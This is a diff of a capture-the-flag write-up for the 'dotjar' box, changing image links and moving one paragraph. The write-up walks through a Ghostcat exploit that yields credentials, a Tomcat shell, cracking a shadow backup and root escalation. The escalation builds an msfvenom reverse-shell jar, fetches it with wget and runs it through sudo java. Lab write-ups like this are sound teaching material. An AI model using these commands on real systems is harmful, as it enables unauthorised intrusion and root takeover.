@@ -18,8 +18,6 @@ I then ran gobuster for port 8080 and here's what I got
 
 ![](/images/dotjar4.png)
 
-I tried to login to the /manager/ directory but it asked for username and password.I was able to login to /host-manager/ but it was of no help.
-
 After searching a bit,I finally found a help 
 from my bestie-Google.I found a article about a exploit named **Ghostcat** CVE-2020-1938.
 
@@ -29,7 +27,7 @@ https://book.hacktricks.xyz/pentesting/8009-pentesting-apache-jserv-protocol-ajp
 
 Then,I searched for this exploit with searchsploit and look I found a python script:multiple/webapps/48143.py 
 
-![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/dotjar2.png)
+![](/images/dotjar2.png)
 
 Finally I ran the python script.
 
@@ -37,9 +35,11 @@ Finally I ran the python script.
 python 48143.py <boxip>
 ```
 
-![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/dotjar3.png)
+![](/images/dotjar3.png)
 
-and here we go.We get a username and a password ***webdev:Hgj3LA$02D$Fa@21***.That's what we wanted. 
+and here we go.We get a username and a password ***webdev:Hgj3LA$02D$Fa@21***.That's what we wanted.
+
+I tried to login to the /manager/ directory but it asked for username and password.I was able to login to /host-manager/ but it was of no help. 
 
 Then,again I started to look for some exploits to hack the Tomcat apache server running in port 8080
 and google again prove it's supremacy.
@@ -63,23 +63,23 @@ Listening to the given port,1234 as given in the exploit in this case,I opened t
 
 And,yes we get a shell and I was logged in as 'web'
 
-![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/dotjar5.png)
+![](/images/dotjar5.png)
 
 After searching a bit we found a backup file of shadow in the /var/backups folder so we copied it to /tmp and gunzipped it to retrieve the shadow file.
 
-![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar.png)
+![](/images/D4rkDemian/jar.png)
 
 Then we cracked the password hash for jdk-admin using john and logged in as jdk-admin
 
-![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar2.png)
+![](/images/D4rkDemian/jar2.png)
 
 Now we can view the user flag..
 
-![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar3.png)
+![](/images/D4rkDemian/jar3.png)
 
 After doing **sudo -l** we found that we have root permissions to run any java file.
 
-![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar4.png)
+![](/images/D4rkDemian/jar4.png)
 
 So we created an exploit using msfvenom 
 
@@ -89,7 +89,7 @@ msfvenom -p java/shell_reverse_tcp lhost=<local ip> lport=1234 -f jar -o pwn.jar
 ```
 Then i opened a http-server and transferred the payload to the shell using wget 
 
-![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar5.png)
+![](/images/D4rkDemian/jar5.png)
 
 ```shell
 python3 -m http.server 80
@@ -102,7 +102,7 @@ sudo /usr/bin/java -jar pwn.jar
 ```
 Now we can view the root flag as well!!
 
-![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar6.png)
+![](/images/D4rkDemian/jar6.png)
 
 
 
